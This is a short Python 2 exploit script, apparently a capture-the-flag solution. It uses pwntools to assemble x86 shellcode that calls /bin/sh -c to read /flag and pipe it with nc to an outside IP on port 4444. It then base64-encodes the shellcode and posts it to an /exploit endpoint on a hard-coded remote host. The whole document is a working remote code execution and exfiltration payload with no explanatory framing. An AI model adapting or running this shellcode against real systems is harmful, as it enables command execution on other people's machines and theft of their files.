from pwn import *
import requests
import json
import base64
import sys

host = "178.128.100.75"
port = 80

#host = "127.0.0.1"
#port = 8080

def pack_cmd(cmd):
    nlen = (len(cmd)+4)/4*4
    cmd = cmd.ljust(nlen, ' ')
    print cmd
    code = ''
    for i in range(nlen/4-1, -1, -1):
        sub_cmd = cmd[4*i:4*i+4]
        code += 'push ' + hex(u32(sub_cmd)) + ';'
    return code
payload = asm(
        "xor    eax,eax;"
        "xor    edx,edx;"

        "push   eax;"+
        pack_cmd("/bin/cat /flag| nc 178.128.218.207 4444")+
        "mov    esi,esp;"

        "push   eax;"
        "push   0x632d;"
        "mov    edi,esp;"    # -c

        "push   eax;"
        "push   0x68732f2f;"
        "push   0x6e69622f;"
        "mov    ebx,esp;"    # /bin/sh

        "push   edx;"
        "push   esi;"
        "push   edi;"
        "push   ebx;"
        "mov    ecx,esp;"
        "mov    al,0xb;"     # prepare args

        "push   ecx;"
        "push   edx;"
        "push   ebp;"
        "mov    ebp, esp;"   # prepare environment for kernel
        "sysenter;"          # call sysenter
        )


#r = process('./bin')
#pause()
#r.send(payload)
#r.interactive()

data = {'payload': base64.b64encode(payload)}
s = requests.Session()
r = s.get('http://{}:{}/'.format(host, port))
r = s.post('http://{}:{}/exploit'.format(host, port), data=json.dumps(data))
print r.content
